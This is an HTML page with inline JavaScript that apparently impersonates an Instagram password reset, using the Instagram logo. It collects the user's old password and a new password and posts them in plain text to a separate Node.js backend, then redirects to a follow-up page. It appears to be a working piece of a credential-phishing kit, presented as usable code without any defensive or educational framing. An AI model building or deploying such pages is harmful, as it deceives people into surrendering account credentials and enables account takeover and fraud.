<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password</title>
    <style>
        /* Your existing CSS styles */
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <div class="title">Create A Strong Password</div>
        <p class="description">Your password must be at least 6 characters long.</p>
        <form id="passwordForm">
            <input type="password" id="oldPassword" name="oldPassword" placeholder="Old password" required>
            <input type="password" id="newPassword" name="newPassword" placeholder="New password" required>
            <input type="password" id="confirmPassword" name="confirmPassword" placeholder="New password, again" required>
            <div class="show-password">
                <input type="checkbox" id="showPasswordToggle"> Show Password
            </div>
            <div id="errorMessage" class="error">Password must be at least 6 characters long.</div>
            <button type="submit">Reset Password</button>
        </form>
    </div>

    <script>
        // JavaScript for validation and form submission
        document.getElementById('passwordForm').addEventListener('submit', async (event) => {
            event.preventDefault(); // Prevent default form submission

            const oldPassword = document.getElementById('oldPassword').value;
            const newPassword = document.getElementById('newPassword').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            const errorMessage = document.getElementById('errorMessage');

            // Validate the new password
            if (newPassword.length < 6) {
                errorMessage.textContent = 'Password must be at least 6 characters long.';
                errorMessage.style.display = 'block'; // Show error message
                return;
            } else if (newPassword !== confirmPassword) {
                errorMessage.textContent = 'Passwords do not match.';
                errorMessage.style.display = 'block'; // Show error message
                return;
            }

            errorMessage.style.display = 'none'; // Hide error message

            try {
                // Send data to the Node.js backend
                const response = await fetch('http://localhost:3000/submit-password', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ oldPassword, newPassword, confirmPassword }),
                });

                if (response.ok) {
                    alert('Password reset submitted successfully!');
                    window.location.href = 'final.html'; // Redirect to the next page
                } else {
                    alert('Failed to submit password reset. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            }
        });

        // JavaScript for Show Password toggle
        const showPasswordToggle = document.getElementById('showPasswordToggle');
        const oldPasswordInput = document.getElementById('oldPassword');
        const newPasswordInput = document.getElementById('newPassword');
        const confirmPasswordInput = document.getElementById('confirmPassword');

        showPasswordToggle.addEventListener('change', function() {
            if (showPasswordToggle.checked) {
                oldPasswordInput.type = 'text';
                newPasswordInput.type = 'text';
                confirmPasswordInput.type = 'text';
            } else {
                oldPasswordInput.type = 'password';
                newPasswordInput.type = 'password';
                confirmPasswordInput.type = 'password';
            }
        });
    </script>
</body>
</html>
